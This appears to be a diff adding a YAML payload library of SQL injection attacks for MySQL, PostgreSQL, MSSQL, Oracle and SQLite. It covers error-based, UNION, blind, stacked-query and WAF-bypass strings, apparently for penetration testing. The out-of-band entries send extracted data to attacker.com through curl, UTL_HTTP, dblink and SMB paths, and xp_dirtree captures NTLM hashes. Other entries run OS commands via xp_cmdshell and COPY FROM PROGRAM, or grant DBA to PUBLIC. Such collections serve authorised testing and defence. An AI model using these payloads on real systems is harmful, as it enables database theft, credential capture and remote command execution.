@@ -1,0 +1,398 @@
+# sqli.yaml — SQL Injection payloads per database engine
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/SQL Injection"
+    - "PortSwigger SQL Injection Cheat Sheet"
+    - "pentestmonkey SQL injection cheat sheets"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# ERROR-BASED SQLi
+# ──────────────────────────────────────────────
+
+error_based:
+  mysql:
+    - name: mysql_extractvalue
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -"
+      context: "MySQL 5.1+ input field vulnerable to error-based SQLi"
+      notes: "extractvalue() throws XPath error containing the query result. 0x7e is tilde for visibility."
+
+    - name: mysql_updatexml
+      payload: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -"
+      context: "MySQL 5.1+ input field vulnerable to error-based SQLi"
+      notes: "updatexml() similar to extractvalue. Returns current database user."
+
+    - name: mysql_double_query
+      payload: "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+      context: "MySQL error-based via duplicate entry error"
+      notes: "GROUP BY with rand() causes duplicate key error leaking query result."
+
+  postgresql:
+    - name: postgres_cast_error
+      payload: "' AND 1=CAST((SELECT version()) AS int)-- -"
+      context: "PostgreSQL input field vulnerable to error-based SQLi"
+      notes: "CAST to int fails and error message contains the string value."
+
+    - name: postgres_convert_error
+      payload: "' AND 1=1/(SELECT 0 FROM pg_sleep(0) WHERE 1=CAST((SELECT current_user) AS int))-- -"
+      context: "PostgreSQL error-based extraction"
+      notes: "Division by cast error leaks data."
+
+  mssql:
+    - name: mssql_convert_error
+      payload: "' AND 1=CONVERT(int,(SELECT @@version))-- -"
+      context: "MSSQL input field vulnerable to error-based SQLi"
+      notes: "CONVERT to int fails, error shows the version string."
+
+    - name: mssql_cast_error
+      payload: "' AND 1=CAST((SELECT DB_NAME()) AS int)-- -"
+      context: "MSSQL error-based extraction"
+      notes: "CAST to int reveals current database name in error."
+
+  oracle:
+    - name: oracle_utl_inaddr
+      payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -"
+      context: "Oracle with UTL_INADDR available"
+      notes: "DNS lookup with user as hostname fails and reveals the value."
+
+    - name: oracle_ctxsys
+      payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -"
+      context: "Oracle with CTXSYS package available"
+      notes: "Context index function error leaks query result."
+
+  sqlite:
+    - name: sqlite_error_based
+      payload: "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -"
+      context: "SQLite error-based extraction"
+      notes: "SQLite has limited error-based options. CAST type mismatch may work."
+
+# ──────────────────────────────────────────────
+# UNION-BASED SQLi
+# ──────────────────────────────────────────────
+
+union_based:
+  mysql:
+    - name: mysql_union_columns
+      payload: "' UNION SELECT NULL,NULL,NULL-- -"
+      context: "MySQL - adjust number of NULLs to match column count"
+      notes: "First determine column count with ORDER BY N. Then replace NULLs with data extraction."
+
+    - name: mysql_union_extract
+      payload: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+      context: "MySQL UNION extraction after column count is known"
+      notes: "group_concat() returns all table names in one string."
+
+    - name: mysql_union_dump_columns
+      payload: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
+      context: "MySQL after discovering table name"
+      notes: "Extract column names from target table."
+
+    - name: mysql_union_dump_data
+      payload: "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -"
+      context: "MySQL after discovering table and column names"
+      notes: "Extract actual data. 0x3a is colon separator."
+
+  postgresql:
+    - name: postgres_union_extract
+      payload: "' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -"
+      context: "PostgreSQL UNION extraction"
+      notes: "string_agg() is PostgreSQL equivalent of group_concat()."
+
+    - name: postgres_union_version
+      payload: "' UNION SELECT NULL,version(),NULL-- -"
+      context: "PostgreSQL UNION with known column count"
+      notes: "Returns full PostgreSQL version string."
+
+  mssql:
+    - name: mssql_union_extract
+      payload: "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -"
+      context: "MSSQL UNION extraction of table names"
+      notes: "sysobjects with xtype=U lists user tables."
+
+    - name: mssql_union_columns
+      payload: "' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -"
+      context: "MSSQL after discovering table name"
+      notes: "Extract column names from target table."
+
+  oracle:
+    - name: oracle_union_extract
+      payload: "' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE rownum<=10-- -"
+      context: "Oracle UNION extraction. Oracle requires FROM clause."
+      notes: "all_tables lists accessible tables. rownum limits output."
+
+    - name: oracle_union_version
+      payload: "' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1-- -"
+      context: "Oracle version extraction"
+      notes: "v$version contains Oracle version info."
+
+  sqlite:
+    - name: sqlite_union_tables
+      payload: "' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'-- -"
+      context: "SQLite UNION extraction of table names"
+      notes: "sqlite_master is the schema table in SQLite."
+
+    - name: sqlite_union_schema
+      payload: "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'-- -"
+      context: "SQLite table schema extraction"
+      notes: "Returns the CREATE TABLE statement showing all columns."
+
+# ──────────────────────────────────────────────
+# BLIND BOOLEAN-BASED SQLi
+# ──────────────────────────────────────────────
+
+blind_boolean:
+  mysql:
+    - name: mysql_blind_bool_version
+      payload: "' AND SUBSTRING(version(),1,1)='5'-- -"
+      context: "MySQL blind boolean extraction, character by character"
+      notes: "Returns true/false based on first char of version. Iterate position and char."
+
+    - name: mysql_blind_bool_table
+      payload: "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5-- -"
+      context: "MySQL blind boolean table count"
+      notes: "Binary search on table count to enumerate database."
+
+  postgresql:
+    - name: postgres_blind_bool
+      payload: "' AND SUBSTRING(current_user,1,1)='p'-- -"
+      context: "PostgreSQL blind boolean extraction"
+      notes: "Extract current user character by character."
+
+  mssql:
+    - name: mssql_blind_bool
+      payload: "' AND SUBSTRING(DB_NAME(),1,1)='m'-- -"
+      context: "MSSQL blind boolean extraction"
+      notes: "Extract database name one character at a time."
+
+  oracle:
+    - name: oracle_blind_bool
+      payload: "' AND SUBSTR((SELECT user FROM dual),1,1)='S'-- -"
+      context: "Oracle blind boolean extraction"
+      notes: "Oracle uses SUBSTR instead of SUBSTRING."
+
+  sqlite:
+    - name: sqlite_blind_bool
+      payload: "' AND SUBSTR(sqlite_version(),1,1)='3'-- -"
+      context: "SQLite blind boolean extraction"
+      notes: "SQLite also uses SUBSTR for substring operations."
+
+# ──────────────────────────────────────────────
+# BLIND TIME-BASED SQLi
+# ──────────────────────────────────────────────
+
+blind_time:
+  mysql:
+    - name: mysql_sleep
+      payload: "' AND IF(1=1,SLEEP(5),0)-- -"
+      context: "MySQL time-based blind. 5 second delay confirms injection."
+      notes: "SLEEP() causes delay. Use with conditional to extract data bit by bit."
+
+    - name: mysql_benchmark
+      payload: "' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -"
+      context: "MySQL time-based when SLEEP is blocked"
+      notes: "BENCHMARK repeats operation causing measurable delay."
+
+  postgresql:
+    - name: postgres_pg_sleep
+      payload: "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -"
+      context: "PostgreSQL time-based blind. 5 second delay confirms injection."
+      notes: "pg_sleep() for time-based extraction."
+
+    - name: postgres_generate_series
+      payload: "' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -"
+      context: "PostgreSQL time-based when pg_sleep is blocked"
+      notes: "Large generate_series causes measurable delay."
+
+  mssql:
+    - name: mssql_waitfor
+      payload: "'; WAITFOR DELAY '0:0:5'-- -"
+      context: "MSSQL time-based blind. 5 second delay confirms injection."
+      notes: "WAITFOR DELAY is MSSQL-specific time delay."
+
+    - name: mssql_conditional_waitfor
+      payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -"
+      context: "MSSQL conditional time-based extraction"
+      notes: "Conditional WAITFOR for data extraction."
+
+  oracle:
+    - name: oracle_dbms_pipe
+      payload: "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)-- -"
+      context: "Oracle time-based blind. 5 second delay confirms injection."
+      notes: "DBMS_PIPE.RECEIVE_MESSAGE waits for specified seconds."
+
+    - name: oracle_heavy_query
+      payload: "' AND 1=(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c WHERE 1=1)-- -"
+      context: "Oracle time-based when DBMS_PIPE is unavailable"
+      notes: "Cartesian product of all_objects causes measurable delay."
+
+  sqlite:
+    - name: sqlite_randomblob
+      payload: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -"
+      context: "SQLite time-based blind"
+      notes: "Large RANDOMBLOB causes measurable delay. Adjust size for desired delay."
+
+# ──────────────────────────────────────────────
+# OUT-OF-BAND (OOB) SQLi
+# ──────────────────────────────────────────────
+
+out_of_band:
+  mysql:
+    - name: mysql_load_file_oob
+      payload: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))-- -"
+      context: "MySQL on Windows with FILE privilege and SMB outbound allowed"
+      notes: "UNC path triggers DNS lookup containing version to attacker DNS."
+
+    - name: mysql_into_outfile_oob
+      payload: "' UNION SELECT version() INTO OUTFILE '\\\\\\\\attacker.com\\\\share\\\\output.txt'-- -"
+      context: "MySQL on Windows with FILE privilege"
+      notes: "Writes data to SMB share, triggering DNS/connection to attacker."
+
+  postgresql:
+    - name: postgres_copy_oob
+      payload: "'; COPY (SELECT version()) TO PROGRAM 'curl attacker.com/?data='||version()-- -"
+      context: "PostgreSQL with superuser or COPY TO PROGRAM privilege"
+      notes: "COPY TO PROGRAM executes OS command. Very powerful if available."
+
+    - name: postgres_dblink_oob
+      payload: "'; SELECT dblink_connect('host=attacker.com user='||(SELECT version())||' dbname=test')-- -"
+      context: "PostgreSQL with dblink extension"
+      notes: "dblink connects to external server, leaking data in connection string."
+
+  mssql:
+    - name: mssql_xp_dirtree
+      payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- -"
+      context: "MSSQL with xp_dirtree enabled"
+      notes: "Triggers SMB connection to attacker. Captures NTLMv2 hash."
+
+    - name: mssql_openrowset
+      payload: "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=test','SELECT 1')-- -"
+      context: "MSSQL with ad hoc distributed queries enabled"
+      notes: "OPENROWSET makes external connection with credentials."
+
+  oracle:
+    - name: oracle_utl_http
+      payload: "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT user FROM dual)) FROM dual-- -"
+      context: "Oracle with UTL_HTTP available and outbound HTTP allowed"
+      notes: "Makes HTTP request to attacker server with extracted data."
+
+    - name: oracle_httpuritype
+      payload: "' UNION SELECT HTTPURITYPE('http://attacker.com/?data='||(SELECT user FROM dual)).GETCLOB() FROM dual-- -"
+      context: "Oracle with HTTPURITYPE available"
+      notes: "Alternative HTTP request method in Oracle."
+
+# ──────────────────────────────────────────────
+# STACKED QUERIES
+# ──────────────────────────────────────────────
+
+stacked_queries:
+  mysql:
+    - name: mysql_stacked_create_table
+      payload: "'; CREATE TABLE pwned (data TEXT)-- -"
+      context: "MySQL with multi-statement support (e.g., mysqli_multi_query)"
+      notes: "MySQL rarely supports stacked queries via PHP mysql/mysqli. Works with some drivers."
+
+  postgresql:
+    - name: postgres_stacked_create
+      payload: "'; CREATE TABLE pwned (data TEXT); INSERT INTO pwned SELECT version();-- -"
+      context: "PostgreSQL stacked queries (supported by default)"
+      notes: "PostgreSQL natively supports stacked queries. Very powerful."
+
+    - name: postgres_stacked_copy_cmd
+      payload: "'; COPY cmd_output FROM PROGRAM 'id';-- -"
+      context: "PostgreSQL with superuser privileges"
+      notes: "Execute OS commands via COPY FROM PROGRAM. Requires superuser."
+
+  mssql:
+    - name: mssql_stacked_xp_cmdshell
+      payload: "'; EXEC xp_cmdshell 'whoami';-- -"
+      context: "MSSQL with xp_cmdshell enabled or sa privileges"
+      notes: "Direct OS command execution. Enable first with sp_configure if disabled."
+
+    - name: mssql_enable_xp_cmdshell
+      payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -"
+      context: "MSSQL with sa privileges, xp_cmdshell disabled"
+      notes: "Re-enable xp_cmdshell via sp_configure. Requires sa role."
+
+  oracle:
+    - name: oracle_execute_immediate
+      payload: "'; EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';-- -"
+      context: "Oracle PL/SQL context with sufficient privileges"
+      notes: "Oracle uses EXECUTE IMMEDIATE for dynamic SQL in PL/SQL blocks."
+
+  sqlite:
+    - name: sqlite_attach_database
+      payload: "'; ATTACH DATABASE '/tmp/pwned.db' AS pwned;-- -"
+      context: "SQLite with stacked query support"
+      notes: "Attach new database, then CREATE TABLE and write data to it."
+
+# ──────────────────────────────────────────────
+# WAF BYPASS ENCODING TECHNIQUES
+# ──────────────────────────────────────────────
+
+waf_bypass:
+  comment_obfuscation:
+    - name: inline_comment_spaces
+      payload: "'/**/UNION/**/SELECT/**/1,2,3-- -"
+      context: "WAF blocking UNION SELECT as keyword pair"
+      notes: "SQL comments /**/ replace spaces. Most databases accept this."
+
+    - name: nested_comments
+      payload: "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"
+      context: "MySQL behind WAF blocking UNION SELECT"
+      notes: "MySQL version-conditional comments. Executes on MySQL >= 5.00.00."
+
+    - name: comment_newline
+      payload: "'UNION%0aSELECT%0a1,2,3-- -"
+      context: "WAF matching UNION SELECT on same line"
+      notes: "Newline (%0a) between keywords breaks line-based matching."
+
+  case_variation:
+    - name: mixed_case
+      payload: "'uNiOn SeLeCt 1,2,3-- -"
+      context: "WAF with case-sensitive keyword matching"
+      notes: "SQL keywords are case-insensitive but some WAFs check exact case."
+
+    - name: keyword_with_null
+      payload: "'UN%00ION SE%00LECT 1,2,3-- -"
+      context: "WAF that doesn't handle null bytes"
+      notes: "Null bytes may terminate WAF string comparison early."
+
+  url_encoding:
+    - name: single_url_encode
+      payload: "'%55NION%20%53ELECT%201,2,3--%20-"
+      context: "WAF checking decoded URL once"
+      notes: "URL encode key characters. Server decodes before SQL execution."
+
+    - name: double_url_encode
+      payload: "'%2555NION%2520%2553ELECT%25201,2,3--%2520-"
+      context: "WAF that decodes URL once, server decodes twice"
+      notes: "Double encoding bypasses single-decode WAF inspection."
+
+  hex_encoding:
+    - name: hex_string_values
+      payload: "' UNION SELECT 1,0x61646d696e,3-- -"
+      context: "WAF blocking string literals in SELECT"
+      notes: "0x61646d696e is hex for 'admin'. Avoid quoted strings in payload."
+
+    - name: char_function
+      payload: "' UNION SELECT 1,CHAR(97,100,109,105,110),3-- -"
+      context: "WAF blocking hex literals"
+      notes: "CHAR() builds string from ASCII codes. Works on MySQL, MSSQL."
+
+  advanced_bypass:
+    - name: scientific_notation
+      payload: "'or 1e0=1e0-- -"
+      context: "WAF blocking 'or 1=1' pattern"
+      notes: "Scientific notation 1e0 equals 1. Bypasses literal pattern matching."
+
+    - name: json_extract_mysql
+      payload: "' UNION SELECT 1,JSON_EXTRACT('{\"a\":\"admin\"}','$.a'),3-- -"
+      context: "MySQL 5.7+ behind WAF blocking string literals"
+      notes: "JSON functions to construct strings dynamically."
+
+    - name: buffer_overflow_waf
+      payload: "'AND 1=1 AND '%s'='%s' UNION SELECT 1,2,3-- -"
+      context: "Replace %s with 2000+ characters to overflow WAF buffer"
+      notes: "Some WAFs have buffer limits. Long input causes WAF to skip analysis."
